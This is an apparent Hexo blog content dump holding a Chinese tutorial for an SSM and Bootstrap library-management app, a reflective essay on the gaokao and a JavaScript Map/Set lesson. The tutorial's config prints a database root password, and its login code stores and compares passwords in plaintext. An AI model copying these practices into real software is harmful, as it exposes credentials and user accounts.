上述url中的地址，并不是web站点的目录，它实际上是在通过Controller来访问web站点的资源。这一点很牛逼哦！因为你无法直接通过目录形式访问得到web资源，你得经过Controller！否则，想登录p站，门都没有。","comments":true,"categories":[{"name":"项目实战","slug":"项目实战","permalink":"http://1905060202.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"框架","slug":"框架","permalink":"http://1905060202.github.io/tags/%E6%A1%86%E6%9E%B6/"},{"name":"SpringMVC","slug":"SpringMVC","permalink":"http://1905060202.github.io/tags/SpringMVC/"}]},{"title":"基于SSM+BootStrap的图书管理项目","date":"2021-06-12T07:26:59.000Z","path":"2021/06/12/基于SSM-BootStrap的图书管理项目/","text":"项目工具 IDEA 2021.1 Mybatis 3.5.2 maven 3.6.1 Tomcat 8.0 spring-webmvc 5.1.9 更多请见下方核心配置 项目数据库设计 表 主键 admin admin_id class_info class_id book_info book_id lend_list ser_num reader_card reader_id reader_info reader_id admin表 名字 数据类型 admin_id bigint password varchar(15) username varchar(15) class_info 表 名字 数据类型 class_id int class_name varchar(15) book_info表 名字 数据类型 book_id bigint(auto increment) name varchar(20) author varchar(15) publish varchar(20) ISBN varchar(15) introduction text language varchar(4) price decimal(10,2) pub_date date class_id int number int lend_list表 名字 数据类型 ser_num bigint book_id bigint reader_id bigint lend_date date back_date date reader_card表 名字 数据类型 reader_id bigint username varchar(15) password varchar(15) reader_info表 名字 数据类型 reader_id bigint(auto increment) name varchar(10) sex varchar(2) birth date address varchar(50) phone varchar(15) 项目结构 Java controller Mapper pojo service resources applicationContext.xml database.properties mybatis-config.xml spring-dao.xml spring-mvc.xml spring-service.xml web css fonts js images WEB-INF 注解：web中的css、fonts、js文件为BootStrap文件，用于前端。 项目结构原理一张图说清楚： 图片源自狂神说微信公众号 核心配置一些题外话在学Spring的时候，有人说这是配置地狱，起初我还不以为意，直到亲手做项目，才感受到什么叫不听老人言，吃亏在眼前。 为了让自己以后不再吃配置的苦，我将把配置源文件的代码放在这里。 发车了pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;&lt;!--Your project--&gt; &lt;groupId&gt;com.hu&lt;/groupId&gt; &lt;artifactId&gt;ssm_build_book&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;!--Junit--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;!--数据库驱动--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 数据库连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;!--Servlet - JSP --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.16.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--Mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--Spring--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.1.9.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.1.9.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt;&lt;/project&gt; spring-service.xml 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;!--scan service--&gt; &lt;context:component-scan base-package=&quot;com.hu.service&quot;/&gt; &lt;!--service class added into Spring--&gt; &lt;bean id=&quot;BooksServicelmpl&quot; class=&quot;com.hu.service.BooksServicelmpl&quot;&gt; &lt;property name=&quot;bookMapper&quot; ref=&quot;bookMapper&quot;/&gt; &lt;/bean&gt; &lt;bean id=&quot;adminServicelmpl&quot; class=&quot;com.hu.service.adminServicelmpl&quot;&gt; &lt;property name=&quot;adminMapper&quot; ref=&quot;adminMapper&quot;/&gt; &lt;/bean&gt; &lt;!--Declare thing configuration--&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;!--add data source--&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt; &lt;/bean&gt;&lt;!--aop--&gt;&lt;/beans&gt; spring-mvc.xml 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;&lt;!--1.note driver--&gt; &lt;mvc:annotation-driven/&gt; &lt;!--2.static resource filter--&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!--3.scan controller--&gt; &lt;context:component-scan base-package=&quot;com.hu.controller&quot;/&gt; &lt;!--view--&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;/&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; spring-dao.xml 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;&lt;!--1.connect database file--&gt;&lt;context:property-placeholder location=&quot;classpath:database.properties&quot;/&gt;&lt;!--2.datasource--&gt;&lt;bean id=&quot;dataSource&quot; class=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;&gt; &lt;property name=&quot;driverClass&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt; &lt;property name=&quot;jdbcUrl&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt; &lt;property name=&quot;user&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt; &lt;!-- c3p0 private property --&gt; &lt;property name=&quot;maxPoolSize&quot; value=&quot;30&quot;/&gt; &lt;property name=&quot;minPoolSize&quot; value=&quot;10&quot;/&gt; &lt;!-- close connection not auto commit --&gt; &lt;property name=&quot;autoCommitOnClose&quot; value=&quot;false&quot;/&gt; &lt;!-- get connection over time --&gt; &lt;property name=&quot;checkoutTimeout&quot; value=&quot;10000&quot;/&gt; &lt;!-- when connection failure restart counts --&gt; &lt;property name=&quot;acquireRetryAttempts&quot; value=&quot;2&quot;/&gt;&lt;/bean&gt; &lt;!--3.sqlSessionFactory--&gt;&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt; &lt;!--bind mybatis equipment file--&gt; &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;&lt;/bean&gt; &lt;!--equip dao interface scan--&gt; &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;!--add sqlSessionFactory--&gt; &lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;/&gt; &lt;!--scan--&gt; &lt;property name=&quot;basePackage&quot; value=&quot;com.hu.Mapper&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; mybatis-config.xml 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;&lt;typeAliases&gt; &lt;package name=&quot;com.hu.pojo&quot;/&gt;&lt;/typeAliases&gt;&lt;mappers&gt; &lt;mapper class=&quot;com.hu.Mapper.bookMapper&quot;/&gt; &lt;mapper class=&quot;com.hu.Mapper.adminMapper&quot;/&gt;&lt;/mappers&gt;&lt;/configuration&gt; database.properties 1234jdbc.driver=com.mysql.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/ssmbuild?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=Asia/Shanghaijdbc.username=rootjdbc.password=100122200 applicationContext.xml 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;import resource=&quot;spring-dao.xml&quot;/&gt; &lt;import resource=&quot;spring-service.xml&quot;/&gt; &lt;import resource=&quot;spring-mvc.xml&quot;/&gt;&lt;/beans&gt; web.xml 123456789101112131415161718192021222324252627282930313233343536373839&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt; &lt;!--DisapatchServlet--&gt; &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;!--complexcode filter--&gt; &lt;filter&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;utf-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;!--Session--&gt; &lt;session-config&gt; &lt;session-timeout&gt;15&lt;/session-timeout&gt; &lt;/session-config&gt;&lt;/web-app&gt; index.jsp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;%-- Created by IntelliJ IDEA. User: 10251 Date: 2021/6/11 Time: 10:30 To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;邂逅海棠&lt;/title&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt; &lt;title&gt;自由而无用&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt; &lt;style&gt; body&#123; padding-top: 50px; &#125; .start&#123; padding:40px 15px; text-align: center; &#125; .xh&#123; padding-left: 415px; margin-top: 80px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;nav class=&quot;navbar navbar-default navbar-fixed-top&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;navbar-brand&quot;&gt;自由而无用&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;#&quot;&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/book/login&quot;&gt;图书管理系统&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/book/about&quot;&gt;关于我&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/nav&gt;&lt;div class=&quot; container xh&quot;&gt; &lt;img src=&quot;images/计算机学院院徽.png&quot; alt=&quot;...&quot; class=&quot;img-circle&quot;&gt;&lt;/div&gt;&lt;div class=&quot;container &quot;&gt; &lt;div class=&quot;start&quot;&gt; &lt;h1 id=&quot;note1&quot; class=&quot;text-primary&quot;&gt;唯实惟新 至诚致志&lt;/h1&gt; &lt;p class=&quot;lead&quot;&gt;欢迎来到自由而无用&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 一套示例代码(实现用户登录功能)controller层： adminController.class 1234567891011121314package com.hu.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;@Controller@RequestMapping(&quot;/book&quot;)public class Book_manage &#123; @RequestMapping(&quot;/book_manage&quot;) public String get_Book_manage()&#123; return &quot;book_manage&quot;; &#125;&#125; loginController.class 1234567891011121314package com.hu.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;@Controller@RequestMapping(&quot;/book&quot;)public class loginController &#123; @RequestMapping(&quot;/login&quot;) public String getAbout()&#123; return &quot;login&quot;; &#125;&#125; Mapper层： adminMapper.class 12345678910111213package com.hu.Mapper;import com.hu.pojo.admin;import com.hu.pojo.books;import java.util.List;public interface adminMapper &#123; int addadmin(admin admin); int deleteadminById(int id); int updateadmin(admin admin); admin queryadminById(int id); List&lt;admin&gt; queryAlladmin();&#125; adminMapper.xml 1234567891011121314151617181920212223242526272829&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.hu.Mapper.adminMapper&quot;&gt;&lt;insert id=&quot;addadmin&quot; parameterType=&quot;admin&quot;&gt; insert into library.admin(admin_id,password,username) values(#&#123;admin_id&#125;,#&#123;password&#125;,#&#123;username&#125;)&lt;/insert&gt; &lt;delete id=&quot;deleteadminById&quot; parameterType=&quot;int&quot;&gt; delete from library.admin where admin_id = #&#123;admin_id&#125;; &lt;/delete&gt; &lt;update id=&quot;updateadmin&quot; parameterType=&quot;admin&quot;&gt; update library.admin set admin_id = #&#123;admin_id&#125;,password=#&#123;password&#125;,username=#&#123;username&#125; where admin_id=#&#123;admin_id&#125; &lt;/update&gt; &lt;select id=&quot;queryadminById&quot; parameterType=&quot;int&quot; resultType=&quot;admin&quot;&gt; select * from library.admin where admin_id = #&#123;admin_id&#125; &lt;/select&gt; &lt;select id=&quot;queryAlladmin&quot; resultType=&quot;admin&quot;&gt; select * from library.admin &lt;/select&gt;&lt;/mapper&gt; Service层： adminService.class 123456789101112131415package com.hu.service;import com.hu.pojo.admin;import java.util.List;public interface adminService &#123; int addadmin(admin admin); int deleteadminById(int id); int updateadmin(admin admin); admin queryadminById(int id); List&lt;admin&gt; queryAlladmin(); admin checkLogin(int admin_id,String password);&#125; adminServicelmpl.class 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.hu.service;import com.hu.Mapper.adminMapper;import com.hu.Mapper.bookMapper;import com.hu.pojo.admin;import java.util.List;public class adminServicelmpl implements adminService&#123; private adminMapper adminMapper; public void setAdminMapper(adminMapper adminMapper)&#123; this.adminMapper = adminMapper; &#125; @Override public int addadmin(admin admin) &#123; return adminMapper.addadmin(admin); &#125; @Override public int deleteadminById(int id) &#123; return adminMapper.deleteadminById(id); &#125; @Override public int updateadmin(admin admin) &#123; return adminMapper.updateadmin(admin); &#125; @Override public admin queryadminById(int id) &#123; return adminMapper.queryadminById(id); &#125; @Override public List&lt;admin&gt; queryAlladmin() &#123; return adminMapper.queryAlladmin(); &#125; @Override public admin checkLogin(int admin_id, String password) &#123; admin admin = adminMapper.queryadminById(admin_id); if(admin!=null&amp;&amp;admin.getPassword().equals(password))&#123; return admin; &#125;else&#123; return null; &#125; &#125;&#125; web层： login.jsp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;%-- Created by IntelliJ IDEA. User: 10251 Date: 2021/6/9 Time: 22:43 To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;图书管理系统&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../css/bootstrap.min.css&quot;&gt; &lt;script src=&quot;../js/JQuery.js&quot;&gt;&lt;/script&gt; &lt;style&gt; .form-control&#123; width: 443px; &#125; .btn-success&#123; width: 150px; &#125; .btn-warning&#123; width: 150px; &#125; .form-group&#123; margin: 5px; padding: 10px; padding-left: 375px; &#125; .form-horizontal&#123; padding-top: 180px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;nav class=&quot;navbar navbar-default navbar-fixed-top&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;navbar-brand&quot;&gt;自由而无用&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;&quot;&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;#&quot;&gt;图书管理系统&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/book/about&quot;&gt;关于我&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/nav&gt;&lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/book/book_manage_2&quot; method=&quot;post&quot; class=&quot;form-horizontal &quot; role=&quot;form&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label class=&quot;col-sm-2 control-label&quot;&gt;账号：&lt;/label&gt; &lt;div class=&quot;col-sm-10&quot;&gt; &lt;input id=&quot;zh&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;账号&quot; name=&quot;admin_id&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label id=&quot;pwd&quot; class=&quot;col-sm-2 control-label&quot;&gt;密码：&lt;/label&gt; &lt;div class=&quot;col-sm-10&quot;&gt; &lt;input id=&quot;pwd_real&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;密码&quot; name=&quot;password&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;div class=&quot;col-sm-offset-2 col-sm-10&quot;&gt; &lt;div class=&quot;checkbox&quot;&gt; &lt;label&gt; &lt;input type=&quot;checkbox&quot;&gt;记住密码 &lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;div class=&quot;col-sm-offset-2 col-sm-2&quot;&gt; &lt;button id=&quot;login&quot; type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt; 登录 &lt;/button&gt; &lt;/div&gt; &lt;div class=&quot; col-sm-offset-5&quot;&gt; &lt;button id=&quot;forget&quot; type=&quot;submit&quot; class=&quot;btn btn-warning&quot;&gt;忘记密码&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt; $(&quot;#login&quot;).click(function checkpwdAndzh()&#123; var name = $(&quot;#zh&quot;).val(); var pass = $(&quot;#pwd_real&quot;).val(); if (name == &quot;&quot;) &#123; alert(&quot;用户名不能为空&quot;); return false; &#125; else if (pass == &quot;&quot;) &#123; alert(&quot;密码不能为空&quot;); return false; &#125; else &#123; return true; &#125; &#125;); var v =0; if(($&#123;v&#125;)==&quot;-1&quot;) alert(&quot;密码或账号错误&quot;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","comments":true,"categories":[{"name":"项目实战","slug":"项目实战","permalink":"http://1905060202.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"框架","slug":"框架","permalink":"http://1905060202.github.io/tags/%E6%A1%86%E6%9E%B6/"},{"name":"BootStrap","slug":"BootStrap","permalink":"http://1905060202.github.io/tags/BootStrap/"}]},{"title":"回首与展望","date":"2021-06-06T15:33:10.000Z","path":"2021/06/06/回首与展望/","text":"一段并不出彩的大学生活19年高考已经是两年前的事了，时间就这样悄然消逝，无声无息。 此刻我坐在书桌前，回忆两年来在大学里做过的事。翘课、吃饭、散步、睡觉。好像，只有这些事，但好像又不止这些事。 来之不易的大学生活已经变得稀松平常，以至于我已经忘了备考时的紧张，就感觉，高考嘛，也没什么了不起的。可是高考对当时的我来说，的的确确就是生命中最重要的事。是因为时间冲淡了记忆，让之前自以为无比重要的时刻变得没那么重要，还是因为，它确实没那么重要呢？我想，处于不同人生阶段的人会有不同的看法。对于高中生而言，高考就是此刻人生中的头等大事。对于我这种人而言，高考就有些遥远了，自己已经习惯了大学的这种生活，所以就也没那么重要。而对于毕了业没找到工作的毕业生而言，他可能会把不如意的原因归到高考这件事上，高考就又是无比重要的事情了。所以，高考重不重要这件事本身并没有意义，它更像是逃避问题的一个借口。 去武汉的火车是在凌晨发车，中午抵达的。我坐在车窗前，贪婪的享受着窗外的群山从漆黑到青葱的过程。我并不急于到达，却又对武汉心心念念。我想多看看层峦叠翠，又想下一刻就在吃热干面。我痴醉于过程，却又想早点品尝结果。这就好比高考的时候，不想毕业，又想早点上大学。过程和结果好像一样重要。只不过我们如此渴望结果，于是开始忽视过程。但，结果又是下一个过程的过程。与其说我们在追求最好的结果，不如说我们在追求完美的过程。什么是完美的结果？在我们的教育体系下，比所有人好的结果就是完美的结果，也可以说比所有人都好的过程，就是完美的过程。而我们是如何比较好坏的呢？这就又要牵扯出价值的评判标准了。 我常常在路上思考价值的评判标准。以前衡量一个学生的价值，基本上是用成绩衡量的。现在去衡量一个学生的价值，就不光要看绩点，还要看竞赛成绩、科研成果种种。到衡量社会人士这一块的价值，就要用成就和人民币斟酌了。所以对于自己而言，什么才是真正的价值？这个是要别人去衡量还是由自己定夺？问题接踵而至。 前面说，自己在大学好像不止经历了那些事。的确，我选修的课程全是和专业无关的。艺术、哲学、性教育、经济与社会，看起来屌用没有，但对我而言却如此重要。我视若珍宝的，在别人看来一文不值。我想，这一块也值得思考，对于自己而言真正的价值是否涵盖别人眼中的无意义。 那高考对于你来说重不重要呢？我想这个问题在我们此刻的人生阶段以及往后都毫无意义了。倘若非要较真，那只能看自己走的是哪条路。是追求完美，还是直面缺憾，我们心中都有答案。 高考在即，无论幸福还是痛苦，人生走的每一步都算数。","comments":true,"categories":[{"name":"闲言碎语","slug":"闲言碎语","permalink":"http://1905060202.github.io/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"}],"tags":[{"name":"人生","slug":"人生","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E7%94%9F/"}]},{"title":"玩转Javascript(三)","date":"2021-06-05T02:41:07.000Z","path":"2021/06/05/玩转Javascript-三/","text":"前排提示本节包含如下几个知识点： Map和Set集合 Iterable迭代 JSON对象 jQuery 发车了Map和SetMap： 12345678910//ES6//[学生的名字，学生的成绩]// var names = [&quot;tom&quot;,&quot;jack&quot;,&quot;peter&quot;];// var scores = [100,90,80];&#x27;use strict&#x27;;var map = new Map([[&quot;tom&quot;,100],[&quot;jack&quot;,90],[&quot;peter&quot;,80]]);var name = map.get(&#x27;tom&#x27;);//通过key值来获得valuemap.set(&#x27;admin&#x27;,999);//新增或修改map.delete(&#x27;tom&#x27;);//删除 Set： 12345&#x27;use strict&#x27;;var set = new Set([1,2,8,9,15])set.add(2);set.delete(1);console.log(set.has(3)) Iterable迭代","comments":true,"categories":[{"name":"脚本语言","slug":"脚本语言","permalink":"http://1905060202.github.io/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"Java 